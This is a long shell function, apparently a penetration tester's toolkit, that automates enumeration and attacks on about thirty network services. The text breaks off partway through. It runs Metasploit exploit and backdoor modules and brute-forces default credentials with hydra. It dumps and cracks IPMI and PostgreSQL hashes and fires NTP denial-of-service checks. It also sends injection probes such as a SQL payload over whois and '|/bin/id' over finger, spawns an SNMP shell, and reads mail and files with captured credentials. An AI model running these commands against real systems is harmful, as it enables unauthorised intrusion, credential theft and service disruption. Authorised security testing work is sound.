srvscan(){
    if [[ $1 == "https" ]]; then
        echo -e "\nSERVER HEADER\n"
        curl -kIL https://$2:$3

        echo -e "\nDEFAULT ALLOWED METHODS\n"
        curl -kILX OPTIONS https://$2:$3

        echo -e "\nGETTING CERTIFICATE\n"
        openssl s_client -connect $2:$3 2>/dev/null | openssl x509 -text -noout

        echo -e "\nTESTING WITH SSLYZE / HEARTBLEED\n"
        sslyze $2:$3
        Heartbleed https://$2:$3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -Pn -sV --script="http-* and not brute","ssl-*" -p$3 $2

        echo -e "\nNUCLEI WEB SCANNING\n"
        nuclei -rl 10 -silent -t http/ -u https://$2:$3

        echo -e "\nNIKTO HTTP SCANNING\n"
        nikto -h $2:$3 -Tuning b
    fi
    if [[ $1 == "http" ]]; then
        echo -e "\nSERVER HEADER\n"
        curl -kIL http://$2:$3

        echo -e "\nDEFAULT ALLOWED METHODS\n"
        curl -kILX OPTIONS http://$2:$3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -Pn -sV --script="http-* and not brute" -p$3 $2

        echo -e "\nNUCLEI WEB SCANNING\n"
        nuclei -rl 10 -silent -t http/ -u http://$2:$3

        echo -e "\nNIKTO HTTP SCANNING\n"
        nikto -h $2:$3 -Tuning b
    fi

    if [[ $1 == "ftp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="ftp-* and not brute" -p$3 $2

        echo -e "\nTRYING MSF TRAVERSAL ATTACKS\n"
        msfconsole -q -x "use auxiliary/scanner/ftp/konica_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/pcman_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$2:$3
        fi

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$2_FTP\"? (Y/N)"
            if [[ $resp =~ [Yy]$ ]]; then
                echo -e "\nDOWNLOADING FILES\n"
                mkdir ./$2_FTP && cd ./$2_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$2:$3
                cd ..
            fi
        fi
    fi

    if [[ $1 == "dns" ]]; then
        echo -e "\nNMAP BANNER / RECURSION CHECK\n"
        sudo nmap -Pn -sUV -n --script "(default and *dns*) or dns-nsid or fcrdns or dns-random-txid or dns-random-srcport" -p$3 $2

	    while true; do
        	read -r dnsdom\?"INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
        	if [[ ! -z $dnsdom ]]; then
                    rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null

                    echo -e "\nREQUESTING \"NS\" RECORDS FOR \"$dnsdom\"\n"
                    ns_records=$(dig ns $dnsdom @$2 -p $3 +short | grep -v "timed out") && echo $ns_records
                    ref_chk=$(dig ns $dnsdom @$2 -p $3 | grep REFUSED | grep -v "timed out")

                    if [[ ! -z $ref_chk || -z $ns_records ]]; then
                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig a $dnsdom @$2 -p $3 +short
                        dig aaaa $dnsdom @$2 -p $3 +short

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig mx $dnsdom @$2 -p $3 +short
                        dig txt $dnsdom @$2 -p $3 +short

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig cname $dnsdom @$2 -p $3 +short

                        if [[ ! -z $ns_records ]]; then
                            echo -e "NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
                            axfr_resp=$(dig axfr $dnsdom @$2 -p $3 | grep $dnsdom --color=never | tail -n +2)

                            if [[ -z $axfr_resp ]]; then
                                echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                echo $2 > /tmp/ns_$dnsdom.txt
                                cur=$(pwd) && cd ~/TOOLS/subbrute
                                python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                cd $cur
                            else
                                echo $axfr_resp
                            fi
                        fi
                    fi

                    if [[ ! -z $ns_records && -z $ref_chk ]]; then
                        echo $ns_records > /tmp/zones_$dnsdom.txt && touch /tmp/ns_$dnsdom.txt
                        while read zone; do
                            ip_chk=$(dig a ${zone%.} @$2 +short)
                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then 
                                echo $2 >> /tmp/ns_$dnsdom.txt
                            else
                                echo $ip_chk >> /tmp/ns_$dnsdom.txt
                            fi
                        done < /tmp/zones_$dnsdom.txt
                        cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/tmp_ns_$dnsdom.txt && mv /tmp/tmp_ns_$dnsdom.txt /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"A / AAAA\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig a $dnsdom @$zone -p $3 +short
                            dig aaaa $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"MX / TXT\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig mx $dnsdom @$zone -p $3 +short
                            dig txt $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nREQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER ALL ZONES\n"
                        while read zone; do
                            dig cname $dnsdom @$zone -p $3 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\nATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                        while read zone; do
                            axfr_resp=$(dig axfr $dnsdom @$zone -p $3 | grep $dnsdom --color=never | tail -n +2 | grep -v "timed out")
                            if [[ ! -z $axfr_resp ]]; then
                                echo $axfr_resp
                                break
                            fi
                        done < /tmp/ns_$dnsdom.txt
                        if [[ -z $axfr_resp ]]; then
                            echo -e "\nZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                            cur=$(pwd) && cd ~/TOOLS/subbrute
                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                            cd $cur
                        fi
                    fi
        	fi
	    done

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "ssh" ]]; then
        echo -e "\nCHECKING VERSION + AUTH METHODS\n"
        sudo nmap -n -Pn -v -sV --script "ssh-auth-methods" --script-args="ssh.user=root" -p$3 $2

        echo -e "\nLAUNCHING SSH-AUDIT\n"
        ssh-audit --port $3 $2

        echo -e "\nMSF BACKDOOR CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/eaton_xpert_backdoor; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$2:$3

            echo -e "\nMSF ENUMERATION (XATO-TOP-1000)\n"
            msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set USER_FILE /usr/share/seclists/Usernames/xato_top_1000_custom.txt; set RHOSTS $2; set RPORT $3; exploit; exit"
        fi
    fi

    if [[ $1 == "telnet" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "telnet-* and not brute" -p$3 $2

        echo -e "\nMSF BROCADE / TELNET ATTACKS\n"
        msfconsole -q -x "use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/telnet/satel_cmd_exec; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://$2:$3
        fi
    fi

    if [[ $1 == "vmware" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "http-vmware-path-vuln or vmware-version" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/vmware/esx_fingerprint; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmauthd_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_server_dir_trav; set RHOSTS $2; set RPORT $3; exploit; exit"     
        msfconsole -q -x "use auxiliary/scanner/vmware/vmware_update_manager_traversal; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "smtp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=smtp-commands,smtp-ntlm-info,smtp-strangeport,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p$3 $2

        read -r mtd\?"INPUT METHOD FOR USER BRUTEFORCING (BLANK TO SKIP): "
        read -r dom\?"INPUT A DOMAIN IF PRESENT: "
        if [[ ! -z $dom ]]; then
            echo -e "\nBRUTEFORCING E-MAIL ADDRESSES ON \"$dom\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -f kali@$dom -t $1 -p $3 -w 15 -D $dom

            echo -e "\nBRUTEFORCING LOCAL USERS ON \"$2:$3\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $1 -p $3 -w 15
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t $1 -p $3 -w 15
        else
            echo -e "\nBRUTEFORCING LOCAL USERS ON \"$2:$3\"\n"
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/Names/names.txt -t $1 -p $3 -w 15
            smtp-user-enum -M $mtd -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t $1 -p $3 -w 15
        fi

        echo -e "\nTESTING OPEN RELAYING\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $2; set RPORT 25; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "whois" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="whois-* and not brute" -p$3 $2

        echo -e "\nTESTING SQL INJECTION\n"
        whois -h $2 -p $3 "a') or 1=1#"

        read -r whois_dom\?"INPUT DOMAIN TO QUERY (BLANK TO SKIP): "
        if [[ ! -z $whois_dom ]]; then
            whois -h $2 -p $3 "$whois_dom"
        fi
    fi

    if [[ $1 == "psql" ]]; then
        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/postgres/postgres_dbname_flag_injection; set RHOST $2; set RPORT $3; run"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$2:$3
        fi

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            user=$(echo $creds | cut -d":" -f1)
            password=$(echo $creds | cut -d":" -f2)

            echo -e "\nMSF HASH DUMPING\n"
            msfconsole -q -x "use auxiliary/scanner/postgres_hashdump; set USERNAME $user; set PASSWORD $password; set RHOSTS $2; set RPORT $3; exploit; exit"

            echo -e "\nATTEMPTING LOGIN\n"
            PGPASSWORD=$password psql -p $3 -h $2 -U $user
        fi
    fi

    if [[ $1 == "tftp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sUV --script="tftp-enum" -p$3 $2

        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/tftpbrute; set RHOST $2; set RPORT $3; set THREADS 10; run"

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/tftp/netdecision_tftp; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "finger" ]]; then
        echo -e "\nGRABBING ROOT BANNER\n"
        echo root | nc -vn $2 $3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=finger -p$3 $2

        echo -e "\nTESTING \"/bin/id\" INJECTION\n"
        finger "|/bin/id@$2"

        echo -e "\nENUMERATING USERS (XATO-TOP-1000)\n"
        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $2; set RPORT $3; set USERS_FILE /usr/share/seclists/Usernames/xato_top_1000_custom.txt; exploit; exit"
    fi

    if [[ $1 == "portmap" ]]; then
        echo -e "\nDISPLAYING RPC INFO\n"
        rpcinfo $2

        echo -e "\nCHECKING USER LISTINGS\n"
        rusers -l $2

        echo -e "\nCHECKING NFS EXPORTS\n"
        showmount -e $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/portmap/portmap_amp; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"INPUT A VALID NIS DOMAIN (BLANK TO SKIP): "
        if [[ ! -z $resp ]]; then
            echo -e "\nDUMPING INFORMATION\n"
            ypwhich -d $resp $2
            ypcat -d $resp -h $2 passwd.byname
            ypcat -d $resp -h $2 group.byname
            ypcat -d $resp -h $2 hosts.byname
            ypcat -d $resp -h $2 mail.aliases
        fi
    fi

    if [[ $1 == "pop3" ]]; then
        echo -e "\nBANNER GRABBING\n"
        echo "quit" | nc -vn $2 $3

        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "pop3-* and not brute" -p$3 $2
    
        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)
           
            echo -e "\nLISTING MESSAGES\n"
            curl -u "$usr:$psw" -s pop3://$2:$3

            while true; do read -r msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$2:$3/$msg; done
        fi

    fi

    if [[ $1 == "nfs" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p$3 $2

        echo -e "\nSHOWMOUNTING CHECKS\n"
        showmount -e $2

        read -r shr\?"INPUT MOUNTABLE SHARE (BLANK TO SKIP): "
        if [[ ! -z $shr ]]; then
            echo -e "\nMOUNTING TO \"/mnt/$2/$shr\"\n"
            sudo mkdir -p /mnt/$2$shr && sudo mount -t nfs $2:$shr /mnt/$2$shr -o nolock && cd /mnt/$2$shr
        fi
    fi

    if [[ $1 == "ident" ]]; then
        read -r portlist\?"INPUT COMMA-SEPARATED OPEN PORTS: "

        echo -e "\nENUMERATING USERS OF SUPPLIED PORTS\n"
        echo $portlist | tr ',' '\n' | while read port; do ident-user-enum $2 $3 $port; done
    fi

    if [[ $1 == "ntp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -sUV -sV --script "ntp-info or ntp-monlist" -p$3 $2

        echo -e "\nREQUESTING METHODS\n"
        ntpq -c readlist $2
        ntpq -c readvar $2
        ntpq -c associations $2
        ntpq -c peers $2
        ntpd -c monlist $2
        ntpd -c listpeers $2
        ntpd -c sysinfo $2

        echo -e "\nMSF DOS CHECKS\n"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_peer_list_sum_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_req_nonce_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_reslist_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ntp/ntp_unsettrap_dos; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "snmp" ]]; then 
        echo -e "\nFINGERPRINTING VERSION\n"
        sudo nmap -n -Pn -sUV --script "snmp-info" -p$3 $2

        read -r snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "
        if [[ $snmp_ver == "3" ]]; then
            echo -e "\nPERFORMING USER BRUTEFORCING (XATO-TOP-1000 / PROBABLE-V2)\n"
            echo "$2:$3" > /tmp/$2_host.txt
            cur=$(pwd) && cd ~/TOOLS/snmpwn && ./snmpwn.rb -u /usr/share/seclists/Usernames/xato_top_1000_custom.txt -p /usr/share/seclists/Passwords/probable-v2-top1575.txt --enclist /usr/share/seclists/Passwords/probable-v2-top1575.txt -h /tmp/$2_host.txt && cd $cur

            echo ""; read -r snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
            usr=$(echo $snmp_data | cut -d':' -f1)
            pass=$(echo $snmp_data | cut -d':' -f2)

            read -r snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
            if [[ $snmp_os == "win" ]]; then
                echo -e "\nEXTRACING USERS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.4.1.77.1.2.25

                echo -e "\nEXTRACTING PROCESSES\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.4.2.1.2            

                echo -e "\nEXTRACTING INSTALLED SOFTWARE\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.25.6.3.1.2

                echo -e "\nEXTRACING LOCAL PORTS\n"
                snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 1.3.6.1.2.1.6.13.1.3
            fi

            echo -e "\nFETCHING STRINGS IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $2:$3 | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $2_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt    

        else
            echo -e "\nATTEMPTING PUBLIC QUERY\n"
            snmpwalk -mAll -r 2 -t 10 -v$snmp_ver -c public $2:$3 NET-SNMP-EXTEND-MIB::nsExtendObjects | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $2_SNMPWALK.txt

            echo -e "\nBRUTEFORCING COMMUNITY STRING\n"
            onesixtyone -p $3 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $2
            echo ""; read -r com_string\?"INPUT A VALID COMMUNITY STRING (CTRL-C IF NONE): "

            echo -e "\nDUMPING PARSED MIB TREE IN \"$2_SNMPCHECK.txt\""
            snmp-check -v $snmp_ver -p $3 -d -c $com_string $2 > $2_SNMPCHECK.txt

            echo -e "\nDUMPING MIB STRINGS IN \"$2_SNMPWALK.txt\"\n"
            snmpwalk -mAll -r 2 -t 10 -v$snmp_ver -c $com_string $2:$3 NET-SNMP-EXTEND-MIB::nsExtendObjects | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $2_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $2_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $2_SNMPWALK.txt

            echo -e "\nTRYING TO SPAWN A NET-SNMP SHELL (WRITE PRIVILEGE)\n"
            /home/kali/TOOLS/snmp-shell/venv/bin/python3 ~/TOOLS/snmp-shell/shell.py -v $snmp_ver -c $com_string $2:$3
        fi
    fi

    if [[ $1 == "rpc" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
	    sudo nmap -n -Pn -sV -p$3 --script="msrpc-enum" $2

	    echo -e "\nTRYING NULL BINDING -> \"rpcclient -U \"%\" -N $2\"\n"
    	rpcclient -U "%" -N $2 -c getdompwinfo,querydispinfo,enumprinters

        echo -e "\nTRYING GUEST BINDING -> \"rpcclient -U \"Guest\" -N $2\"\n"
        rpcclient -U "Guest" -N $2 -c getdompwinfo,querydispinfo,enumprinters

        echo -e "\nCHECKING IOXID INTERFACES\n"
        /home/kali/TOOLS/IOXIDResolver/venv/bin/python3 ~/TOOLS/IOXIDResolver/IOXIDResolver.py -t $2
    fi

    if [[ $1 == "imap" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="imap-* and not brute" -p$3 $2
    
        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)

            echo -e "\nLISTING MAILBOXES\n"
            curl -u "$usr:$psw" imap://$2:$3 -X 'LIST "" "*"'

            while true; do read -r mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$2:$3/$mailbox && read -r index\?"INPUT MAIL UID TO read -r (BLANK TO SKIP): " && curl -u "$usr:$psw" "imap://$2:$3/$mailbox;UID=$index"; done
        fi

    fi

    if [[ $1 == "ipmi" ]]; then
        echo -e "\nENUMERATING VERSION\n"
        sudo nmap -n -Pn -v -sUV --script "ipmi-* or supermicro-ipmi-conf" -p$3 $2
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $2; set RPORT $3; exploit; exit"

        echo -e "\nCHECKING ANONYMOUS USER LISTING\n"
        ipmitool -I lanplus -H $2 -U '' -P '' user list

        echo -e "\nCHECKING HASH DUMP\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $2; set RPORT $3; set OUTPUT_JOHN_FILE /tmp/$2_IPMI.john; exploit; exit"
        if [[ -f /tmp/$2_IPMI.hashcat ]]; then
            echo -e "\nFOUND HASH, CRACKING WITH ROCKYOU\n"
            john --wordlist=/usr/share/wordlists/weakpass_4.txt --fork=15 --session=ipmi --rules=Jumbo --format=rakp /tmp/$2_IPMI.john
        fi

        echo -e "\nCHECKING CIPHER ZERO\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $2; set RPORT $3; exploit; exit"

        read -r resp\?"IS CIPHER ZERO SUCCESSFUL? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            echo -e "\nAUTHENTICATING AS ROOT AND DUMPING USERS\n"
            ipmitool -I lanplus -C 0 -H $2 -U root -P root user list
        fi
    fi

    if [[ $1 == "ldap" ]]; then
        echo -e "\nNMAP SCANNING\n"
        sudo nmap -n -Pn -sV --script "ldap-* and not brute" -p$3 $2

        echo -e "\nTESTING NULL BINDING\n"
        nxc ldap $2 --port $3 -u '' -p '' --query "(sAMAccountType=805306368)" "sAMAccountName description"
    fi

    if [[ $1 == "netbios" ]]; then
        echo -e "\nGETTING DOMAINS, HOSTS AND MACS\n"
        nmblookup -A $2
        nbtscan $2/30
        sudo nmap -sCV --script nbstat -p$3 -n -Pn $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/netbios/nbname; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "afp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="afp-* and not dos and not brute" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/afp/afp_server_info; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "smb" ]]; then
        echo -e "\nNMAP SERVICE ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="smb-enum-* or smb-ls or smb-os-discovery or smb2-* or smb-mbenum or smb-security-mode or smb-server-stats or smb-system-info" -p$3 $2

        echo -e "\nTRYING NULL BINDINGS (LOCAL/DOMAIN)\n"
        nxc smb $2 -u '' -p '' --local-auth --port $3 --users --shares --pass-pol --rid-brute 10000
        nxc smb $2 -u '' -p '' --port $3 --users --shares --pass-pol --rid-brute 10000

        echo -e "\nTRYING GUEST BINDINGS (LOCAL/DOMAIN)\n"
        nxc smb $2 -u 'Guest' -p '' --local-auth --port $3 --users --shares --pass-pol --rid-brute 10000
        nxc smb $2 -u 'Guest' -p '' --port $3 --users --shares --pass-pol --rid-brute 10000

        echo -e "\nNMAP VULNERABILITY SCANNING\n"
        sudo nmap -p$3 -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $2

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi

    if [[ $1 == "irc" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="irc-* and not brute" -p$3 $2

        echo -e "\nATTEMPTING ANONYMOUS CONNECTION TO THE IRC AS \"test_user\"\n"
        irssi -c $2 -p $3 -n test_user
    fi

    if [[ $1 == "ike" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV -p$3 --script="ike-version" $2

        echo -e "\nLAUNCHING IKE-SCAN -> CHECK IF 1 HANDSHAKE AND 0 NOTIFY\n"
        sudo ike-scan -M --showbackoff $2 -d $3
        sudo ike-scan -M --showbackoff --ikev2 $2 -d $3

        read -r tra\?"DO YOU WANT TO BRUTEFORCE ID VALUES? (Y/N)"
        if [[ $tra =~ [Yy] ]]; then
            echo -e "\nBRUTEFORCING TRANSFORMATION\n"
            sudo python3 ~/TOOLS/iker.py $2
        fi
    
